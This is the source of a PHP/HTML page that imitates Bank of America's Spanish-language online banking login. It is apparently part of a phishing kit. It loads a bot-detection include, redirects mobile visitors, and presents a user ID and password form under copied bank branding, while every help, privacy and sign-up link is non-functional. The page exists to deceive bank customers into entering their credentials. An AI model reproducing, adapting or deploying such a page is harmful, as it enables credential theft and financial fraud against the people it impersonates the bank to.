<?php
require_once "is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/normalize.min.css">
    <link rel="stylesheet" href="css/estilos.css">
    <title>Bank of America | Banca en Línea | Entrar | Identificación en línea</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <script type="text/javascript">
        if (screen.width < 801) {
            window.location = "mLogin.go";
        }      
    </script>
</head>
<body>
    <div class="container">
        <div class="banner1">
          <img src="img/logo.jpg" alt="logo">
          <p class="txtg">Entrar</p>
          <div class="derLinks">
            <img class="sarea" src="img/lock.jpg" alt="candado">
            <div class="areaSegura">Área protegida</div>
            <img class="sarea2" src="img/points.jpg" alt="puntos">
            <div class="lenguaje">In English</div>
          </div>
        </div>
        <div class="banner2">
          <h1>Entrar en la Banca en Línea</h1>
        </div>
    
        <div class="banner3">
          <div class="columnas">
            <form autocomplete="off" id="formusuario">
              <div class="form-group">
                <label for="usuario" class="titulo-input">Identificación en línea</label>
                <input type="text" name="usuario" id="usuario" maxlength="32" required="required">
                <input type="checkbox" name="reco"><label class="inline-titulo-input" for="reco">Guardar esta Identificación
                  en línea</label>
                <img src="img/help.jpg" alt="ayuda">
              </div>
              <div class="form-group" style="margin-bottom: 23px;">
                <label for="clave" class="titulo-input2">Contraseña</label>
                <input type="password" name="clave" id="clave" required maxlength="20" disabled>
              </div>
              <div class="form-group" style="margin-bottom: 31px;">
                <a href="javascritpt:void(0)">¿Olvidó su Contraseña?</a>
              </div>
              <div class="form-group">
               
                <button class="btn-azul" id="enviarusuario">
                  <span></span> Entrar</button>
              </div>
            </form>
            <!-------------------Columna2-------------------->
            <div class="columna2">
              <p class="tituloColumna2">Manténgase conectado con la app</p>
              <img src="img/movil.jpg" alt="movil">
              <p class="titulo2Columna2">Transacciones seguras y convenientes en todo momento</p>
              <button class="btn-rojo">
                <span> Obtener la aplicación</span>
              </button>
            </div>
            <!-------------------Columna3------------------->
            <div class="columna3">
              <h2>Ayuda para entrar</h2>
              <ul>
                <li><a href="javascript:void(0)">¿Olvidó su Identificación en línea o Contraseña?</a></li>
                <li><a href="javascript:void(0)">¿Tiene problemas para entrar?</a></li>
              </ul>
              <h2 class="titulito">¿No utiliza la Banca en Línea?</h2>
              <ul>
                <li><a href="javascript:void(0)">Inscríbase ahora</a></li>
                <li><a href="javascript:void(0)">Más información sobre la Banca en Línea</a></li>
                <li><a href="javascript:void(0)">Acuerdo de servicio</a></li>
              </ul>
    
            </div>
    
          </div>
        </div>
        <div class="banner4">
          <div class="fondolock"></div>
          <p>Área protegida</p>
          <div class="enlaces-footer">
            <a href="javascript:void(0)">Privacidad</a> <a href="javascript:void(0)">Seguridad</a>
          </div>
          <div class="copirait">
            <p>Bank of America, N.A. Miembro de FDIC. </p><a href="javascript:void(0)"> Igualdad de oportunidades en préstamos para viviendas</a>
            <span class="corporation">© 2021 Bank of America Corporation.<span>
          </div>
        </div>
      </div>
      <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
      <script src="js/funciones.js"></script>
</body>
</html>
